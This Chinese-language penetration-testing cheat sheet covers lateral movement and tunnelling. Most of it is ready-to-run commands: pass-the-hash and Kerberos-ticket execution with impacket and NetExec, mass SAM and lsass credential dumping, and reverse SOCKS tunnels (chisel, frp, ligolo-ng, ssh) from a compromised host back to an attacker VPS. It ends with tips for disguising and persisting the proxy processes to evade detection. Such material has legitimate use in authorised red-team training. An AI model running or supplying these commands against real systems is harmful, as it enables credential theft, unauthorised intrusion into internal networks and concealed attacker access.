# 横向移动与代理隧道

## 1. 知识点讲解

横向移动 = 用凭据/漏洞在多台机器间复制「立足点」。选通道三问：①用什么凭据（明文/哈希/票据）？②走什么协议（SMB/WMI/WinRM/RDP/SSH）？③过不过得了防火墙（需要隧道吗）？日志友好度：PTH 哈希 < Kerberos 票据 < 明文登录。

## 2. Windows 横向命令速查

```bash
# —— impacket 家族（Linux 打 Windows 主力）
psexec.py corp.local/admin:P@ss@10.0.0.5                    # 明文
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 admin@10.0.0.5
wmiexec.py -hashes :NTLMHASH admin@10.0.0.5                 # 无文件落地，最安静之一
smbexec.py / atexec.py / dcomexec.py                        # 各有日志特征，轮换用
psexec.py -k -no-pass dc01.corp.local                       # 票据（需 KRB5CCNAME）

# —— nxc（NetExec，CME 正统后继）批量验证与执行
nxc smb 10.0.0.0/24 -u admin -H NTLMHASH                    # 全网验证哈希有效性
nxc smb 10.0.0.5 -u admin -p pass -x "whoami"               # 执行命令
nxc winrm 10.0.0.5 -u admin -p pass -X "powershell..."
nxc smb 10.0.0.0/24 -u admin -p pass --sam                  # 批量抓 SAM
nxc smb targets.txt -u admin -p pass -M lsassy              # 模块抓 lsass

# —— Windows 原生
wmic /node:10.0.0.5 /user:admin /password:pass process call create "cmd /c whoami > c:\x"
PsExec64.exe \\10.0.0.5 -u admin -p pass -s cmd
winrs -r:10.0.0.5 -u:admin -p:pass cmd
mstsc /v:10.0.0.5                                           # RDP（注意会话踢人与日志）
```

判据：445 通 → psexec/smbexec；5985 通 → winrm；135+动态端口 → wmiexec/dcomexec。Pwn3d! 标记 = 有本地管理员。

## 4. 隧道与代理（内网穿行术）

### 场景与选型
| 场景 | 方案 |
| --- | --- |
| 边界机可出站，要进内网 | frp 反向代理 / chisel reverse socks |
| 只有 HTTP(S) 出站 | chisel http 模式 / dnscat2（仅 DNS 时） |
| 要攻击机「进入」三层内网网段 | ligolo-ng（TUN 接口，体验最好） |
| 就地转发单端口 | ssh -L/-R、netsh portproxy |
| 多级跳板 | 逐段 socks + proxychains 串联 |

### 核心命令
```bash
# chisel（单文件，最常用）
vps:   ./chisel server -p 8000 --reverse
靶机:  ./chisel client vps:8000 R:socks
本地:  proxychains4 nxc smb 10.0.0.5 -u admin -H HASH      # 默认 socks5 127.0.0.1:1080

# frp
frps.toml: bindPort = 7000
frpc.toml: serverAddr="vps" serverPort=7000
           [[proxies]] name="socks" type="tcp" remotePort=1080 plugin="socks5"

# ligolo-ng（推荐，支持直连路由、性能高）
vps:   ./proxy -selfcert -laddr 0.0.0.0:11601
靶机:  ./agent -connect vps:11601 -ignore-cert
proxy 控制台: session → start → tuntap 自动加路由，攻击机直接访问内网 IP

# ssh 系（Linux 环境零依赖）
ssh -D 1080 user@jump                    # 正向 socks
ssh -R 1080:target:3389 user@vps         # 反向单端口
netsh interface portproxy add v4tov4 listenport=3389 connectport=3389 connectaddress=内网IP

# proxychains 配置：/etc/proxychains4.conf → socks5 127.0.0.1 1080（注释掉 proxy_dns 视情况）
```

### 多级代理拓扑设计
```text
攻击机 → VPS → 边界机（dmz socks:1081）→ 内网机（core socks:1082）
proxychains4.conf 链式：
socks5 127.0.0.1 1081
socks5 127.0.0.1 1082
```
注意：每层代理时延叠加，扫描调低速率（`--min-rate 500` 以下）；Windows 目标用 nxc/impacket 走代理时选支持 socks 的工具或全程 ligolo-ng。

## 5. 隐蔽与稳定性

- 代理进程伪装：改名+写计划任务守护；frp/chisel 参数走配置文件避免进程列表泄露明文。
- 通道加密：frp `tls_enable`、chisel 默认加密；避免明文王八。
- 断线自愈：chisel `--keepalive`、frp `login_fail_exit=false`。
